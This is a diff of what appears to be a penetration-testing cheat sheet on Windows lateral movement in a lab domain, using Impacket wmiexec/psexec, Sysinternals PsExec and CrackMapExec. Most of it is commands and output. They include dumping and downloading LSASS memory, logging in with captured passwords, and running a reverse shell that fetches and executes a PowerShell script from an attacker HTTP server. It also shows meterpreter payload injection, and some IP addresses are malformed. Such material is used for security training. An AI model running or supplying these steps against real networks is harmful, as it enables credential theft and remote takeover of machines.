@@ -7,48 +7,27 @@ Requirement:
 
 Index
 ======
-1. WMIexec (Impacket version - Pass-The-Hash or with login/password)
-2. PSexec (Impacket version - Pass-The-Hash or with login/password)
-3. CrackMapExec (Pass-The-Hash or with login/password) + Metasploit (meterpreter reverse shell)
+1. WMIexec (Impacket)
+2. PSexec (Sysinternals or Impacket)
+3. CrackMapExec 
 4. WMIexec (impacket) + Powershell (PowerCat.ps1) + NetCat
 5. SMBclient + VBS reverse shell + CrackMapExec (WMI) + NetCat
 
 
 ========================================================================================================================
-Example 1 - WMIexec (Impacket version - Pass-The-Hash or with login/password)
+1. WMIexec (Impacket version - Remote login with Pass-The-Hash or username/password)
 ========================================================================================================================
 
-jeff@kali-Linux:~$ wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:ad5f04d33d00db5f062376115c5acdc9 administrator@192.168.1.50
+jeff@kali-Linux:~$ wmiexec.py security-lab/administrator@192.168.1.50
 Impacket v0.9.21.dev1 - Copyright 2020 SecureAuth Corporation
 
+Password:
 [*] SMBv3.0 dialect used
 [!] Launching semi-interactive shell - Careful what you execute
 [!] Press help for extra shell commands
 
 C:\>whoami
-win-evagj1t16qd\administrator
-
-C:\>cd Users
-C:\Users>cd administrator                                                                                                                                         
-C:\Users\administrator>cd desktop
-C:\Users\administrator\desktop>cd tools
-
-
-C:\Users\administrator\desktop\tools>cd Powerup
-C:\Users\administrator\desktop\tools\Powerup>dir
- Volume in drive C has no label.
- Volume Serial Number is C022-C9A0
-
- Directory of C:\Users\administrator\desktop\tools\Powerup
- 03/23/2020  03:41 PM    <DIR>          .
- 03/23/2020  03:41 PM    <DIR>          ..
- 03/23/2020  03:49 PM           303,366 PowerUp-invoke-allchecks.txt
- 05/29/2017  11:35 PM           562,841 PowerUp.ps1
-               2 File(s)        866,207 bytes
-               2 Dir(s)   9,156,866,048 bytes free
-
-C:\Users\administrator\desktop\tools\Powerup>get PowerUp-invoke-allchecks.txt
-[*] Downloading C:\\Users\administrator\desktop\tools\Powerup\PowerUp-invoke-allchecks.txt
+security-lab\administrator
 
 C:\>cd temp
 C:\temp>put procdump64.exe
@@ -64,10 +43,47 @@ Sysinternals - www.sysinternals.com
 [02:41:23] Dump 1 complete: 32 MB written in 0.1 seconds
 [02:41:24] Dump count reached.
 
+C:\temp>get lsassdump.dmp
+[*] Downloading C:\\Temp\lsassdump.dmp
+
 
 ========================================================================================================================
-Example 2 - PSexec (Impacket version - Pass-The-Hash or with login/password)
+2. PSexec (MS Sysinternals version or Impacket version)
 ========================================================================================================================
+
+Example - PSexec64.exe - MS Sysinternals version
+-------------------------------------------------
+
+C:\Users\Administrator\Documents\Tools-AD\SysinternalsSuite>PsExec64.exe \\192.168.1.51 -u administrator -p Welcome1 cmd
+
+PsExec v2.2 - Execute processes remotely
+Copyright (C) 2001-2016 Mark Russinovich
+Sysinternals - www.sysinternals.com
+
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+oracleserver1\administrator
+
+C:\Windows\system32>dir
+ Volume in drive C has no label.
+ Volume Serial Number is 6C7D-B2EF
+
+ Directory of C:\Windows\system32
+
+11/27/2022  03:57 PM    <DIR>          .
+11/27/2022  03:57 PM    <DIR>          ..
+07/16/2016  08:12 AM    <DIR>          0409
+07/16/2016  05:18 AM               308 @AudioToastIcon.png
+07/16/2016  05:18 AM               450 @BackgroundAccessToastIcon.png
+07/16/2016  05:18 AM               760 @edptoastimage.png
+07/16/2016  05:18 AM               330 @EnrollmentToastIcon.png
+<SNIP>
+
+
+Example - PSexec.py - Impacket version - Remote login with Pass-The-Hash or username/password
+----------------------------------------------------------------------------------------------
 
 jeff@kali:~/Documents/CTFs/BadBlood$ psexec.py security-lab/qualys@192.168.1.50
 Impacket v0.9.21.dev1 - Copyright 2020 SecureAuth Corporation
@@ -94,9 +110,69 @@ exit
 
 
 ========================================================================================================================
-Example 3 - CrackMapExec (Pass-The-Hash or with login/password) + Metasploit (meterpreter reverse shell)
+3. CrackMapExec
 ========================================================================================================================
 
+Github links:
+> https://github.com/Porchetta-Industries/CrackMapExec
+> https://github.com/maaaaz/CrackMapExecWin
+
+
+Examples - Basic remote command execution
+--------------------------------------------
+C:\Users\Administrator.PO718687\Documents\Tools-AD\CrackMapExecWin>crackmapexec.exe -d . -u administrator -p Welcome1 -X "whoami" 192.168.1.51
+11-27-2022 16:39:02 [*] 192.168.1.51:445 is running Windows 10.0 Build 14393 (name:ORACLESERVER1) (domain:.)
+11-27-2022 16:39:02 [+] 192.168.1.51:445 Login successful .\administrator:Welcome1
+11-27-2022 16:39:41 [+] 192.168.1.51:445 Executed command via WMIEXEC
+11-27-2022 16:39:41 oracleserver1\administrator
+
+C:\Users\Administrator.PO718687\Documents\Tools-AD\CrackMapExecWin>crackmapexec.exe -d . -u administrator -p Welcome1 -X "net localgroup Administrators" 192.168.1.51
+11-27-2022 16:42:04 [*] 192.168.1.51:445 is running Windows 10.0 Build 14393 (name:ORACLESERVER1) (domain:.)
+11-27-2022 16:42:04 [+] 192.168.1.51:445 Login successful .\administrator:Welcome1
+11-27-2022 16:42:17 [+] 192.168.1.51:445 Executed command via WMIEXEC
+11-27-2022 16:42:17 Alias name     Administrators
+11-27-2022 16:42:17 Comment        Administrators have complete and unrestricted access to the computer/domain
+11-27-2022 16:42:17
+11-27-2022 16:42:17 Members
+11-27-2022 16:42:17
+11-27-2022 16:42:17 -------------
+11-27-2022 16:42:17 Administrator
+11-27-2022 16:42:17 auditor
+11-27-2022 16:42:17 The command completed successfully.
+
+
+Example - Remote execution of a reverse shell
+------------------------------------------------
+PS C:\AD\jfc-tools\CrackMapExecWin> .\crackmapexec.exe -u admin -p password1 -x "powershell.exe -c iex (New-Object Net.WebClient).DownloadString('http://192..168.4.200/Invoke-PowerShellTcp2.ps1');" 192..168.4.217
+08-28-2020 18:34:16 [*] 192..168.4.217:445 is running Windows 10.0 Build 14393 (name:Server2) (domain:security-lab)
+08-28-2020 18:34:16 [+] 192..168.4.217:445 Login successful security-lab\admin:password1
+
+C:\AD\jfc-tools>python -m SimpleHTTPServer 80
+Serving HTTP on 0.0.0.0 port 80 ...
+192..168.4.217 - - [28/Aug/2020 18:34:21] "GET /Invoke-PowerShellTcp2.ps1 HTTP/1.1" 200 -
+
+PS C:\AD\jfc-tools> catpower -l -p 443 -v -t 1000
+VERBOSE: Set Stream 1: TCP
+VERBOSE: Set Stream 2: Console
+VERBOSE: Setting up Stream 1...
+VERBOSE: Listening on [0.0.0.0] (port 443)
+VERBOSE: Connection from [X.X.X.X] port  [tcp] accepted (source port 50946)
+VERBOSE: Setting up Stream 2...
+VERBOSE: Both Communication Streams Established. Redirecting Data Between Streams...
+Windows PowerShell running as user appadmin on DCORP-APPSRV
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.
+
+PS C:\>
+
+PS C:\>whoami
+security-lab\admin
+
+PS C:\> hostname
+Server2
+
+
+Example - Remote execution of a meterpreter payload
+----------------------------------------------------
 jeff@kali:~/Documents/CTFs/BadBlood$ sudo crackmapexec smb 192.168.1.50 -u Qualys -p Qua1ys2020 -M pe_inject -o PATH=./payload_tcp.exe
 SMB         192.168.1.50    445    TEMP-DC          [*] Windows Server 2012 R2 Standard 9600 x64 (name:TEMP-DC) (domain:SECURITY-LAB) (signing:True) (SMBv1:True)
 SMB         192.168.1.50    445    TEMP-DC          [+] SECURITY-LAB\Qualys:Qua1ys2020 (Pwn3d!)
@@ -162,12 +238,7 @@ SeRemoteShutdownPrivilege
 SeRestorePrivilege
 SeSecurityPrivilege
 SeShutdownPrivilege
-SeSystemEnvironmentPrivilege
-SeSystemProfilePrivilege
-SeSystemtimePrivilege
-SeTakeOwnershipPrivilege
-SeTimeZonePrivilege
-SeUndockPrivilege
+<SNIP>
 
 
 ========================================================================================================================
